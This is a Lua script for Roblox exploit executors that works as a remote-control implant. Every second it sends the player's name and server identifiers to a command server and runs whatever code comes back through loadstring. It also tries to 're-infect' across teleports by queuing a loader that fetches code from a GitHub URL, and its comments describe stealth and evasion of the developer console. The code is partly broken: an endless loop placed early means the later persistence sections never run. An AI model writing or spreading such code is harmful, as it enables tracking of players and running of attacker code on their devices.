local Player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Market = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")

local PlaceName = Market:GetProductInfo(game.PlaceId).Name
local serverLink = "https://raw.githubusercontent.com/TuMeuT-Original/asf-/refs/heads/main/djpiska"

-- Improved queue_on_teleport function
local function improvedQueueOnTeleport(scriptContent)
    if not scriptContent then return end
    
    local success, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player, nil, {
            infect_script = HttpService:JSONEncode({script = scriptContent, server = serverLink})
        })
    end)
    
    if not success then
        getgenv()._infectQueue = getgenv()._infectQueue or {}
        getgenv()._infectQueue[#getgenv()._infectQueue + 1] = scriptContent
        
        if syn then
            syn.queue_on_teleport(scriptContent)
        elseif queue_on_teleport then
            queue_on_teleport(scriptContent)
        end
    end
end

-- Obfuscated anti-F9 detection
local antiF9 = {
    getgenv = getgenv,
    HttpGet = game.HttpGet,
    loadstring = loadstring
}

-- Stealth ping function (original URL format, no prints)
local function stealthPing()
    local url = string.format(
        "http://moonrise.playit.plus:27177/api/roblox_ping?placeid=%s&jobid=%s&playername=%s&placename=%s",
        game.PlaceId,
        game.JobId,
        HttpService:UrlEncode(Player.Name),
        HttpService:UrlEncode(PlaceName)
    )
    
    local success, response = pcall(antiF9.HttpGet, game, url)
    if success and response then
        local success2, data = pcall(HttpService.JSONDecode, HttpService, response)
        if success2 and data and data.execute then
            pcall(antiF9.loadstring, antiF9.loadstring, data.script)()
        end
    end
end

-- Simple reliable loop (1 second intervals)
while task.wait(1) do
    stealthPing()
end

-- Initial queue
pcall(improvedQueueOnTeleport, [[
    getgenv()._infectQueue = getgenv()._infectQueue or {}
    for i, script in ipairs(getgenv()._infectQueue or {}) do
        loadstring(script)()
    end
]])

-- Self-reinfection protection (runs first)
if getgenv()._infected then return end
getgenv()._infected = true

-- Final fallback teleport queue
spawn(function()
    wait(2)
    local fallbackScript = 'loadstring(game:HttpGet("' .. serverLink .. '"))()'
    if queue_on_teleport then
        queue_on_teleport(fallbackScript)
    end
    if syn and syn.queue_on_teleport then
        syn.queue_on_teleport(fallbackScript)
    end
end)
